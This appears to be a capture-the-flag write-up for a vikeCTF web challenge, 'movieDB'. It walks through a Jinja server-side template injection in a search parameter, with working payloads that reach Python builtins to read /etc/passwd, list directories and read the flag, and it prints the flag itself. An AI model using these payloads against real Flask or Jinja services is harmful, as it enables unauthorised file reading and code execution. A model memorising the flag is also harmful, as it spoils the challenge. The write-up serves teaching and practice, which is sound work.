# movieDB

**Author: [`Malcolm Seyd`](https://github.com/malcolmseyd)**

**Category: `Web Easy`**

## Description

Ahoy, ye brave movie seekers! Welcome to MovieDB, where the flicks flow like mead and the security... well, let's just say it's a bit like an unlocked treasure chest in a Viking village. But fret not! With a sprinkle of humor and a dash of caution, we'll navigate these cinematic seas together, laughing in the face of cyber shenanigans. So grab your popcorn and let's pillage... I mean, peruse through our database of movie marvels!

## Organizers

Do not release the source code. This is solely a hosted challenge.

This challenge has an RCE vulnerability and must be resilient to fork bombs. As such, you should use the following command to limit the processes to whatever is appropriate.

```console
$ docker build -t moviedb .
$ docker run --rm -p 8000:8000 --pids-limit 100 moviedb
```

The container also contains a health check, use it as you will.

## Solution

This solution is a Jinja Server-Side Template Injection attack.

First, we check `robots.txt`, and we notice that the flag is at `/static/flag.txt`. Nice. Time to probe for file reading vulnerabilities.

If you pass a non-number into a numeric form input, it'll throw and exception and return it to the user:

```console
$ curl -s --get --data-urlencode "search=a" --data-urlencode 'max-year=whatever' http://localhost:8000

            <h1>Something went wrong!</h1>
            <pre>Traceback (most recent call last):
  File "/app/server.py", line 54, in home
    params.append(int(max_year))
                  ^^^^^^^^^^^^^
ValueError: invalid literal for int() with base 10: 'whatever'
</pre>
```

This string is vulnerable to template injection, so any input in this URL parameter will execute as a Jinja template.

After doing some research, and some trial and error, we can access [arbitrary builtins](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---read-remote-file) using the following template, which uses this to run `open("/etc/passwd").read()`.

```
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

I wrote a [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%5C%5Cn'%7D,';',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'BUILTINS'%7D,'get_flashed_messages.__globals__.__builtins__',true,false,true,false)URL_Encode(true)&input=e3tCVUlMVElOUy5saXN0KEJVSUxUSU5TLl9faW1wb3J0X18oInBhdGhsaWIiKS5QYXRoKCkuaXRlcmRpcigpKX19) that makes it easier to access the builtin object. We can write any code that doesn't contain an apostrophy and fits in one expression. Paste the resulting value in the URL bar for the value of `max-year`.

We can use this to read the contents of the filesystem:

```
{{BUILTINS.list(BUILTINS.__import__("pathlib").Path().iterdir())}}
    makes it return:
[PosixPath('healthcheck.sh'), PosixPath('static'), PosixPath('index.html'), PosixPath('movies.sqlite3'), PosixPath('server.py'), PosixPath('requirements.txt')]


{{BUILTINS.list((BUILTINS.__import__("pathlib").Path()/"static").iterdir())}}
    makes it return:
[PosixPath('static/pico.min.css'), PosixPath('static/flag.txt')]
```

There's the flag! Let's read it:

```
{{BUILTINS.open("static/flag.txt").read()}}
    makes it return:
vikeCTF{y0u_tH0Gh7_iT_w4S_5QL_1Nj3c7i0n}
```

Too easy! Executing a fork bomb or getting a reverse shell is left as an exercise to the reader.

## Flag

```
vikeCTF{y0u_tH0Gh7_iT_w4S_5QL_1Nj3c7i0n}
```
